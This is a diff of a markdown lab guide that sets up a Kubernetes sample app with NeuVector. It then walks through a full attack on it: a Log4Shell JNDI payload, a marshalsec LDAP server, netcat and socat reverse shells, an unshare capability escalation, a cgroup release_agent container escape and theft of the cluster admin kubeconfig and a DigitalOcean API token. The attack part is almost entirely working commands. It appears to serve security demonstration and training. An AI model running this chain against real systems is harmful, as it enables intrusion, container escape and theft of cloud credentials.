@@ -1,4 +1,4 @@
-# Installing the Kubernetes application
+# Step 1 - Installing the Kubernetes application
 1. Login into your victim machine via ssh with username and passwort
 2. Switch to into the yaml directory
 ```
@@ -16,10 +16,50 @@ kubectl apply -f ~/yaml/sample_app_service_ingress.yml
 ```
 cat ~/yaml/sample_app_service_ingress.yml
 ```
-# Installing NeuVector
+# Step 3 - Install cert-manager
+
+cert-manager is a Kubernetes add-on to automate the management and issuance of TLS certificates from various issuing sources.
+
+The following set of steps will install cert-manager which will be used to manage the TLS certificates for NeuVector.
+
+## Run the following commands on the victim VM.
+
+First, we'll add the helm repository for Jetstack
+
+```helm repo add jetstack https://charts.jetstack.io```
+
+Now, we can install cert-manager:
+
+```helm install \  cert-manager jetstack/cert-manager \
+  --namespace cert-manager \
+  --version v1.11.0 \
+  --set installCRDs=true \
+  --create-namespace
+```
+
+Once the helm chart has installed, you can monitor the rollout status of both `cert-manager` and `cert-manager-webhook`
+
+```kubectl -n cert-manager rollout status deploy/cert-manager```
+
+You should eventually receive output similar to:
+
+`Waiting for deployment "cert-manager" rollout to finish: 0 of 1 updated replicas are available...`
+
+`deployment "cert-manager" successfully rolled out`
+
+```kubectl -n cert-manager rollout status deploy/cert-manager-webhook```
+
+# Step 2 - Installing NeuVector
 ```
 helm repo add neuvector https://neuvector.github.io/neuvector-helm/
 ```
+In order to automatically generate a selfsigned TLS certificate for NeuVector, we have to configure a ClusterIssuer in cert-manager, that the NeuVector helm chart can reference:
+```
+kubectl apply -f ~/yaml/nv_clusterIssuer_certificate.yml
+```
+You can find more information in the [cert-manager docs](https://cert-manager.io/docs/).
+
+Finally, we can install NeuVector using our `helm install` command.
 ```
 helm install neuvector neuvector/core \
   --namespace cattle-neuvector-system \
@@ -28,130 +68,180 @@ helm install neuvector neuvector/core \
   --create-namespace
 ```
 
-# Start the Attack
-1. First open netcat in the first terminal to receive remote shells
+# Step 3 - Prepare the Attack
+Let's install an application that poses as an LDAP server and provider a Java class to the vulnerable application which will create a remote connection back to the **attacker VM**. We will use python3 and  socat which are already installed on the attacker machine. Login into the attacker machine with username and password via SSH. 
+
+1. Change the promt to identify the shell.
+
+```
+export VM=attacker
+PS1="\u@$VM:\w>"
+```
+
+2. Then we need to set the variable for the public IP address
+
+```export PUBLIC_IP=<public ip address>```
+
+3. Download the app
+
+```
+wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/poc.py
+wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/requirements.txt
+mkdir ~/target
+wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/target/marshalsec-0.0.3-SNAPSHOT-all.jar -P ~/target
+pip3 install -r requirements.txt
+```
+
+3. Download a vulnerable JDK
+
+```
+wget https://download.java.net/openjdk/jdk8u43/ri/openjdk-8u43-linux-x64.tar.gz
+tar -xvf openjdk-8u43-linux-x64.tar.gz
+mv java-se-8u43-ri/ jdk1.8.0_20
+```
+
+4. Now we can run the python app that provides the exploit
+
+```
+sudo python3 poc.py --userip ${PUBLIC_IP} --webport 80 --lport 443 &
+```
+
+5. And start listening for remote shells
 ```
 sudo nc -lvnp 443
 ```
-## Then open socat in the 2nd terminal
+
+## Run the following commands on a second shell on the  attacker VM.
+open a second sheel to the attacker VM and we name it **attacker2**
+
+```
+export VM2=attacker2
+PS1="\u@$VM2:\w>"
+```
+
 ```
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 ```
 
-## Start the LDAP Server on the 3rd terminal
-```
-sudo python3 poc.py --userip <puplic IP> --webport 80 --lport 443 &
-```
-+ Tells the client please load a java class from my webserver
+# Step 4 - Run attack
+
+Now let's start the attack. The following HTTP request triggers a log4shell vulnerability because the app logs the user agent.
+
+Because of that log4j will connect to the attacker's LDAP server, which will provide a Java class that gets executed by the sample app and create a remote shell from the container to the attacker's netcat session:
+
+## Run the following commands on the victim VM
 
 ```
-curl http://sample-app.default.<PUPLIC IP VICTIM>.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://<PUPLIC IP ATTACKER:1389/a}'
+curl http://sample-app.default.${PUBLIC_IP}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${ATTACKER_PUBLIC_IP}:1389/a}'
 ```
+The first shell on the **attacker VM** now received a remote shell from the container.
 
-## Working inside of the container
-+ do a `ps`
-+ do a `ls`
-+ Dry to download `kubectl`
+## Run the following commands on the first attacker terminal.
+
+We can list the container filesystem
+
+```ls -la```
+
+or the running processes
+
+```ps auxf```
+
+Let's try to install kubectl into the container
+
 ```
 curl -LO --insecure "https://dl.k8s.io/release/$(curl -L -s --insecure https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/
 ```
-+ Execute `kubectl get pods`
-+ Let's try something else and list the Linux capabilities of the container
-```
-capsh --print
-```
 
-+ Let's try to change this by exploiting a Kernel vulnerability:
+And access the Kubernetes API. This should create an error, because the Pod's ServiceAccount does not have any permissions to access the Kubernetes API:
+
+```kubectl get pods```
+
+Let's try something else and list the Linux capabilities of the container
+
+```capsh --print```
+
+Not that our container does not have `cap_sys_admin` capabilities.
+
+Let's try to change this by exploiting a Kernel vulnerability:
+
 ```
 unshare -UrmC bash
 capsh --print
 ```
-# Break out of the container with an additional vulnerability
-+ manipulate the c group release agent
+
+Now that we have `cap_sys_admin` capabilities. We can try to exploit another Kernel bug to break out of the container and create a second remote shell from the host system to the second terminal on the **attacker VM**.
+
+Create a new RDMA cgroup
+
 ```
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
-+ we mount the cgroup controller to /tmp/cgroup
-+ and create a cgroup called x
-+ Now we configure the notification service of the release agent 
+
+Enables cgroup notifications on release of the "x" cgroup
 
 ```
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
+
+Get the path of the OverlayFS mount for our container
+
 ```
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 ```
-```
-echo $host_path
-```
-+Set the release agent to execute /{overlay_fs_host_path}/cmd on the host (/cmd inside of the container) when the cgroup is released
+
+Set the release agent to execute `/{overlay_fs_host_path}/cmd` on the host (`/cmd` inside of the container) when the cgroup is released
 
 ```
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
 
+Create the command, which will run socat and create a remote shell to the second shell on the **attacker VM**
+
 ```
 echo '#!/bin/bash' > /cmd
-echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.68.166.70:4444" >> /cmd
+echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${vminfo:attacker02:public_ip}:4444" >> /cmd
 chmod a+x /cmd
 ```
-+ Run echo in the cgroup, which will directly exit and trigger the release agent cmd
+
+Run `echo` in the cgroup, which will directly exit and trigger the release agent cmd (execute `/{overlay_fs_host_path}/cmd`):
+
 ```
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-# Execute commands on the new host terminal
+Now we got a remote shell to the **second attacker shell**  where we are root directly on the **victim host**
+
+**Run the following commands on the attacker02 VM.**
 
 ```
-ls -al
 whoami
 docker ps
 ```
 
-## Get access to the K8s API
-```
-docker cp kubelet:/usr/local/bin/kubectl /usr/bin/
-```
-+ Get kubeconfig
+Install kubectl
+
+```docker cp kubelet:/usr/local/bin/kubectl /usr/bin/```
+
+Get kubeconfig
+
 ```
 kubectl --kubeconfig $(docker inspect kubelet --format '{{ range .Mounts }}{{ if eq .Destination "/etc/kubernetes" }}{{ .Source }}{{ end }}{{ end }}')/ssl/kubecfg-kube-node.yaml get configmap -n kube-system full-cluster-state -o json | jq -r .data.\"full-cluster-state\" | jq -r .currentState.certificatesBundle.\"kube-admin\".config | sed -e "/^[[:space:]]*server:/ s_:.*_: \"https://127.0.0.1:6443\"_" > kubeconfig_admin.yaml
-```
-```
+
 export KUBECONFIG=$(pwd)/kubeconfig_admin.yaml
 ```
 
+Now we are admin in the Kubernetes cluster
 
-+ Now we are admin in the Kubernetes cluster 
-```
-kubectl get pods -A
-```
-## Get Digital Ocean Token
-```
-kubectl get deployments -A
-```
+```kubectl get pods -A```
 
-```
-kubectl get secrets -n kube-system
-```
-+ Get the cloud provider token
+Get the cloud provider token
+
 ```
 do_token=$(kubectl get secret -n kube-system digitalocean -o jsonpath="{.data.access-token}" | base64 --decode)
-echo $do_token
-```
-+ Login into digital ocen
-```
-doctl auth init -t $do_token
 ```
 
-+ create a compute ressource 
-```
-doctl compute droplet create hacking-demo --region fra1 --size s-1vcpu-1gb --image ubuntu-20-04-x64 --wait
-```
-+ show machine in the digitial ocean dashboard
+Try to log in with the token:
 
-+ After the machine is created please delete the resource
-```
-doctl compute droplet delete hacking-demo -f
-```
+```doctl auth init -t $do_token```
 
 
